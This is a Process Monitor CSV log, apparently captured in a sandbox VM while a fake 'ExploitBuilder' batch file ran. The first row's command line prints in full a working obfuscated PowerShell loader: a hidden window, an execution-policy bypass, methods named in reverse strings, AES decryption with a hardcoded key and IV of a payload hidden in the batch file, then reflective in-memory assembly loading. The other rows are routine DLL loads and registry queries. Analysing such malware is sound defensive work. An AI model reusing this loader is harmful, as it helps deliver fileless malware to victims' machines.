"Time of Day","Process Name","PID","Operation","Path","Result","Detail","User","Authentication ID","Session","Virtualized"
"5:30:17.3663535 PM","ExploitBuilder - Copy.bat.exe","2232","Process Start","","SUCCESS","Parent PID: 924, Command line: ""ExploitBuilder - Copy.bat.exe""  -noprofile -windowstyle hidden -ep bypass -command $eaqcw = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\vagrant\Desktop\ExploitBuilder - Copy.bat').Split([Environment]::NewLine);foreach ($VtoBl in $eaqcw) { if ($VtoBl.StartsWith(':: ')) {  $BMjJe = $VtoBl.Substring(3); break; }; };$VGGCQ = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($BMjJe);$hbvqO = New-Object System.Security.Cryptography.AesManaged;$hbvqO.Mode = [System.Security.Cryptography.CipherMode]::CBC;$hbvqO.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$hbvqO.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=');$hbvqO.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('E55hmIoW8UIQx1ajzTvfAA==');$CfOAS = $hbvqO.CreateDecryptor();$VGGCQ = $CfOAS.TransformFinalBlock($VGGCQ, 0, $VGGCQ.Length);$CfOAS.Dispose();$hbvqO.Dispose();$YVjlv = New-Object System.IO.MemoryStream(, $VGGCQ);$iJFSw = New-Object System.IO.MemoryStream;$uwkaq = New-Object System.IO.Compression.GZipStream($YVjlv, [IO.Compression.CompressionMode]::Decompress);$uwkaq.CopyTo($iJFSw);$uwkaq.Dispose();$YVjlv.Dispose();$iJFSw.Dispose();$VGGCQ = $iJFSw.ToArray();$WtHIs = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($VGGCQ);$iFZWS = $WtHIs.EntryPoint;$iFZWS.Invoke($null, (, [string[]] ('C:\Users\vagrant\Desktop'))), Current directory: C:\Users\vagrant\Desktop\, Environment: ;	=C:=C:\Users\vagrant\Desktop;	=ExitCode=00000000;	AaqVUJsFhc=le -;	AaSnbDWVNC='C:\Users\vagrant\Desktop\ExploitBuilder - Copy.bat';	ABhSbrTgER=0\;	abXWCidkkf=tion;	aCkWUTDwPk=VGGC;	AEGfPCrqyO=ose(;	aeYBWrDapi=flec;	afjOzRjDnI=, $V;	AGhPrBoWKq=[Env;	aGJlSTmIGr=ach ;	AiKHpVuHKm=5hmI;	aJsZZKACuq=s.En;	akYMOsYnBg=ll;	AlJuqVPqiH=he;	ALLUSERSPROFILE=C:\ProgramData;	AmwyQLBXEf=Disp;	aofwGrYKuk=.Dis;	aokxLffLvH=$iJF;	APPDATA=C:\Users\vagrant\AppData\Roaming;	aqEygMCsht=stem;	ATPSKtJvTi=jlv.;	AVRwaCHxXU=en -;	AVXNOWCrYy=onve;	AzaeVLnSKm=tem.;	bAmPlzaFrS=y ;	BEUzRjjltF=);	bhSpiBQTgK=[]] ;	BJwIuQohOC=esaB;	bKVwefFpfQ=ntLi;	bLSkxzIocm=em;	BmWAAtoZtA=16] ;	BRPfxdubya=ew-O;	bUGEgUQYXJ=m.IO;	BWGXyurnmg=\v;	bWuTzORYXG=y/0e;	byKscheqza=Wi;	CBDAOBTbyT=BC;$;	cEanUwXIQf=if n;	CEnbLsFZSW=s\;	CflouPSIiw=ment;	CgjLTCAhEv=oin ;	CjhfiUztjJ=ileP;	CJPfaXxzJf=prof;	cKMZbqsBMw=ptor;	cKvGHTjDvb=ert];	CKviuLofrZ= = [;	cljFYzXQJX=st 'C:\Windows\system32;	cMTCEkLKSS=] -j;	cMWZwvyPjN=;$Wt;	CommonProgramFiles=C:\Program Files\Common Files;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files;	CommonProgramW6432=C:\Program Files\Common Files;	COMPUTERNAME=TEST-WIN;	ComSpec=C:\Windows\system32\cmd.exe;	CpbqGCWJyV=Sw);;	CPCBmZCrbB=ll;	cPevnUWtSS= New;	CtfEtfqbKZ=CQ);;	cYlaqThezL=ct S;	cYlGmAGehm=m.IO;	czFmiBKjRi=-joi;	dAXIMoUSbi=ion.;	DAysEPJMyz=-Obj;	dhErvhUcWt=pher;	dJmyrtUeqc=ypto;	DluwAwkRVl=pose;	dLXChMDheV=ionM;	dmwwglsEzU=w = ;	dmZgVbtblN=WtHI;	doFipcMbJK=)($B;	dpPDluddlQ=IQx1;	DpXgcFEpEf=rity;	DRQxQsDOCj=OAS ;	DrxExOTxWf=bvqO;	DSZmMyFEsf=$CfO;	DvvURCtIoF=ode];	DXkpYciLMH=1..-;	DZAtvAAPfh=AS.T;	eaMQOeTuky=grap;	egGOGJBDLg=[Sys;	egKnzEtMZI= /;	egRYBGozVX=eam(;	eicofqiouq=omma;	EIInafGGUu=y.Cr;	ePcoAupSbC=bvqO;	etQcZuKmyN==');;	eVpNFQBQDl=nd;	eZLqvcziaM=gume;	FcWRXTvQjv=GGCQ;	FDyEkPUkrz=)) {;	FFubWFHHwC=iron;	FGLLskrNAo=HIs ;	fhUreVqiuD=we;	FIfzngtwnr= '');	fIzceWuXKM=s & ;	fKiWJovwSn== [S;	FnOmSPrnVA=;$Cf;	fPpNQjSMFw=.-11;	fSULLwiEcv=pose;	FtdLQlshwV===');	fvuHoEUOnP=]::C;	fxAMcxnHqd=yste;	GbWAhixrGF=VGGC;	GcnempLkRh=e]::;	gCZhHGPpYj=S46e;	GEjfgYPPBb=.Cry;	GKUDRMEpaS=st;	goPbqCDqmt=[Sys;	GPQNFBjqgi=cd /;	gQBxzrLgMn=tem.;	GqROtqxuqI=ke($;	GurPRNFWbo=PKCS;	gvHRRsHTEc=rS;	gwIgwSeaBE=ws;	gySOngycEi=embl;	GZJDreBRax='wYP;	hBggSuTAct=em.C;	HBzagEsWLP=MjJe;	hcnXVafHGf=sion;	HEFmnVtMIe=ateD;	HepXLrKnvX=' -V;	hERqKpkJoh=brea;	hLkMSkxvSy=;$YV;	hmbEshvCUg=('C:\Users\vagrant\Desktop';	HNYmvxNiUB=raph;	HOMEDRIVE=C:;	HOMEPATH=\Users\vagrant;	HOWpeTYmYC=oryS;","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3663916 PM","ExploitBuilder - Copy.bat.exe","2232","Thread Create","","SUCCESS","Thread ID: 3704","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3721237 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Users\vagrant\Desktop\ExploitBuilder - Copy.bat.exe","SUCCESS","Image Base: 0x7ff639250000, Image Size: 0x70000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3721875 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\ntdll.dll","SUCCESS","Image Base: 0x7ff96b170000, Image Size: 0x1d1000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3723378 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Segment Heap","REPARSE","Desired Access: Query Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3723593 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\Session Manager\Segment Heap","NAME NOT FOUND","Desired Access: Query Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3729253 PM","ExploitBuilder - Copy.bat.exe","2232","CreateFile","C:\Users\vagrant\Desktop","SUCCESS","Desired Access: Execute/Traverse, Synchronize, Disposition: Open, Options: Directory, Synchronous IO Non-Alert, Attributes: n/a, ShareMode: Read, Write, AllocationSize: n/a, OpenResult: Opened","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3730801 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\kernel32.dll","SUCCESS","Image Base: 0x7ff969280000, Image Size: 0xab000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3732141 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\KernelBase.dll","SUCCESS","Image Base: 0x7ff967da0000, Image Size: 0x21d000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3742170 PM","ExploitBuilder - Copy.bat.exe","2232","RegQueryValue","HKLM\System\CurrentControlSet\Control\WMI\Security\05f95efe-7f75-49c7-a994-60a55cc09571","NAME NOT FOUND","Length: 524","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3744643 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\SafeBoot\Option","REPARSE","Desired Access: Query Value, Set Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3744832 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\SafeBoot\Option","NAME NOT FOUND","Desired Access: Query Value, Set Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3744987 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\Srp\GP\DLL","REPARSE","Desired Access: Read","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3745089 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\Srp\GP\DLL","NAME NOT FOUND","Desired Access: Read","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3745213 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers","SUCCESS","Desired Access: Query Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3745410 PM","ExploitBuilder - Copy.bat.exe","2232","RegQueryValue","HKLM\SOFTWARE\Policies\Microsoft\Windows\safer\codeidentifiers\TransparentEnabled","NAME NOT FOUND","Length: 80","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3745557 PM","ExploitBuilder - Copy.bat.exe","2232","RegCloseKey","HKLM\SOFTWARE\Policies\Microsoft\Windows\safer\codeidentifiers","SUCCESS","","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3745727 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKCU\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers","NAME NOT FOUND","Desired Access: Query Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3747471 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\advapi32.dll","SUCCESS","Image Base: 0x7ff968840000, Image Size: 0xa2000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3748815 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\msvcrt.dll","SUCCESS","Image Base: 0x7ff9687a0000, Image Size: 0x9e000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3749812 PM","ExploitBuilder - Copy.bat.exe","2232","Thread Create","","SUCCESS","Thread ID: 1920","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3750556 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\sechost.dll","SUCCESS","Image Base: 0x7ff968c60000, Image Size: 0x59000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3752176 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\rpcrt4.dll","SUCCESS","Image Base: 0x7ff96af70000, Image Size: 0x121000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3753690 PM","ExploitBuilder - Copy.bat.exe","2232","Thread Create","","SUCCESS","Thread ID: 1856","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3753845 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\ole32.dll","SUCCESS","Image Base: 0x7ff9689b0000, Image Size: 0x137000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3755540 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\combase.dll","SUCCESS","Image Base: 0x7ff969630000, Image Size: 0x2c8000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3757881 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\ucrtbase.dll","SUCCESS","Image Base: 0x7ff967920000, Image Size: 0xf5000","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3760199 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\Session Manager","REPARSE","Desired Access: Query Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3760513 PM","ExploitBuilder - Copy.bat.exe","2232","RegOpenKey","HKLM\System\CurrentControlSet\Control\Session Manager","SUCCESS","Desired Access: Query Value","TEST-WIN\vagrant","00000000:000210a6","1","False"
"5:30:17.3760554 PM","ExploitBuilder - Copy.bat.exe","2232","Load Image","C:\Windows\System32\bcryptprimitives.dll","SUCCESS","Image Base: 0x7ff9678b0000, Image Size: 0x6a000","TEST-WIN\vagrant","00000000:000210a6","1","False"
